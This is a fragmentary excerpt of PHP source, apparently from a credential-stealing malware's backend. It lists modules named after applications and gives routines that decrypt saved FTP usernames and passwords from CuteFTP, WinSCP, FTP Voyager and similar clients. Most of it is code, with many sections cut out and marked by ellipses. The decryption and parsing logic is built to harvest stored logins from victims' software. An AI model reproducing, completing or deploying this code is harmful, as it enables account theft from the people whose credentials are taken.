...
$global_module_list = array(
	...
	array("module_yandexinternet",	    0x00000054, 'Yandex.Internet'),
    ...
    array("module_fasttrack",			0x00000060, 'FastTrack'),
);
...
class stream
{
	...
	function read_word()
	{
		...
		$p = $this->pos;
		$this->pos += 2;
		return (int)((int)ord($this->data[$p+1]) << 8 | 
			(int)ord($this->data[$p]));
	}
...
class module_cuteftp extends module
{
	...
	function DecryptPassNew($pass)
	{
		...
		{
			$this->char_swap($pass, $i, $i+3);
			$this->char_swap($pass, $i+1, $i+2);
		}
	...
	function Handle68_69_6c($stream, $Is69)
	{
		...
		if ($Is69 >= 0x6d)
		{
			$this->CuteFTPItem["user"] = $this->DecryptPassNew($stream->read_bytestring());
			$this->CuteFTPItem["pass"] = $this->DecryptPassNew($stream->read_bytestring());
		} else
		{
			$this->CuteFTPItem["user"] = $stream->read_bytestring();
			$this->CuteFTPItem["pass"] = $this->DecryptPass($stream->read_bytestring());
	...
	protected function process_dat($value, $isquick)
	{
		...
		while ($stream->state)
		{
			...
			} else
			{
				...
				if (($CType != 'CTreeItem') && ($CType != 'CSMFTPItem') && ($CType != 'CSMSite'))
				{
...
class module_ftpcommander extends module
{
	protected function decrypt($pass)
	{
		if (!strlen($pass))
...
class module_dopus extends module
{
 	protected function strip_bad_xml_tags($xml_data)
	{
		...
		while (($i = strpos($xml_data, '<3>')) !== false)
		{
			$j = strpos($xml_data, '</3>', $i+1);
			if ($j === false)
				break;
			$xml_data = substr($xml_data, 0, $i).substr($xml_data, $j+1);
		}
...
class module_winscp extends module
{
 	private function decrypt($host, $user, $encrypted_password)
	{
		...
		if (substr($plain_password, 0, $blen) == $user.$host)
			return substr($plain_password, $blen);
		else
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
		return '';
	}
...
class module_opera extends module
{
...
class module_ftpvoyager extends module
{
    ...
    private function read_ftp_item($stream, $log, $processing_mode = 0)
    {
		...
		if ($record_ver > 73)
		{
			$stream->read_bytestring(); // Certitifacte
		}
...
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FastTrack
class module_fasttrack extends module
{
